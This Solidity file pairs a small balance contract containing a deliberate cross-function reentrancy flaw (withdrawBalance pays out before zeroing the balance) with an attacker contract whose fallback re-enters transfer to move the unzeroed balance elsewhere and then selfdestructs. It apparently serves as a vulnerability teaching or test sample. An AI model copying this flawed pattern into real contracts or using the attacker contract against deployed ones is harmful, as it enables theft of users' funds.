pragma solidity ^0.5.1;

contract CFRC {
    mapping (address => uint) private userBalances;

    function deposit() public payable {
        userBalances[msg.sender] += msg.value;
    }
    
    function balance() public view returns(uint) {
        return userBalances[msg.sender];
    }

    function transfer(address _recipient, uint _amount) public {
        require(userBalances[msg.sender] >= _amount);
        
        userBalances[_recipient] += _amount;
        userBalances[msg.sender] -= _amount;
    }
    
    function withdrawBalance() public payable {
        uint amountToWithdraw = userBalances[msg.sender];
        msg.sender.call.value(amountToWithdraw)("");
        userBalances[msg.sender] = 0;
    }
}

contract Caller {
    CFRC cfrc;
    address payable owner;
    address receiver;
    
    constructor(CFRC c, address r) public {
        cfrc = c;
        owner = msg.sender;
        receiver = r;
    }
    
    function deposit() public payable {
        cfrc.deposit.value(msg.value)();    
    }
    
    function withdrawTwice() public payable {
        cfrc.withdrawBalance();
    }
    
    function() external payable {
        cfrc.transfer(receiver, msg.value);
        selfdestruct(owner);
    }
}